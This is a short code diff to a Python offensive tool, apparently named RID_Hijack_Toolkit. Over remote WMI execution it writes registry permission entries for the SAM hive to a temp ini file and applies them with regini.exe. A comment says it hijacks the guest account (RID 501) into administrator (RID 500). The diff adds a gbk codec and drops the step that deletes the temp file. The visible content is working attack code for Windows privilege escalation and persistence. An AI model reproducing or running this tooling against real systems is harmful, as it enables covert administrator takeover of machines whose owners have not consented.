@@ -48,7 +48,7 @@ class RID_Hijack_Toolkit():
         iWbemServices.RemRelease()
 
     def Permissions_Controller(self, action, user):
-        exec_command = EXEC_COMMAND(self.iWbemLevel1Login)
+        exec_command = EXEC_COMMAND(self.iWbemLevel1Login, codec="gbk")
         regini_Attr =[
             r'HKEY_LOCAL_MACHINE\SAM [1 17]',
             r'HKEY_LOCAL_MACHINE\SAM\SAM [1 17]',
@@ -78,7 +78,7 @@ class RID_Hijack_Toolkit():
         else:
             cmd = ""
             for i in regini_Attr: cmd += r'echo %s >> C:\windows\temp\windows.ini && '%i
-            cmd += r"regini.exe C:\windows\temp\windows.ini && del /q /f C:\windows\temp\windows.ini"
+            cmd += r"regini.exe C:\windows\temp\windows.ini"
             exec_command.exec_command_silent(command=cmd)
 
     # Default is hijacking guest(RID=501) users to administrator(RID=500)
